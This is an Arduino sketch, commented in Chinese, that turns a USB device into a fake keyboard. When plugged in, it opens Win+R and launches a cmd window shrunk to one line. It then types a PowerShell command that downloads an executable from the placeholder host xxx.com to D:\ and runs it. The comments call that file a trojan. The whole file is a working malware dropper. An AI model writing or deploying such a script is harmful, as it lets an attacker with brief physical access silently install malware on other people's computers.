#include <Keyboard.h>
void setup() {
// put your setup code here, to run once:
Keyboard.begin();//开始键盘通讯
delay(5000);//延时
Keyboard.press(KEY_CAPS_LOCK);//开启大写锁
Keyboard.release(KEY_CAPS_LOCK);
delay(50);
Keyboard.press(KEY_LEFT_GUI);//win键
delay(500);
Keyboard.press('r');//r键
delay(500);
Keyboard.release(KEY_LEFT_GUI);//按住win+R
Keyboard.release('r');
Keyboard.print("cmd.exe /T:01 /K mode CON: COLS=16 LINES=1");//输入cmd
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);//回车
delay(500);
Keyboard.print("powershell (new-object System.Net.WebClient).DownloadFile( 'http://xxx.com/test/goog.exe','D:\goog.exe')");//远程下载木马，并保存到D盘
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);//回车
delay(500);
Keyboard.print("D:");//输入cmd
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);//回车
delay(500);
Keyboard.print("goog.exe");//运行木马
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);//回车
delay(500);
Keyboard.print("exit");//退出
Keyboard.press(KEY_RETURN);
Keyboard.release(KEY_RETURN);//回车
Keyboard.end();
}
void loop() {
// put your main code here, to run repeatedly:
}
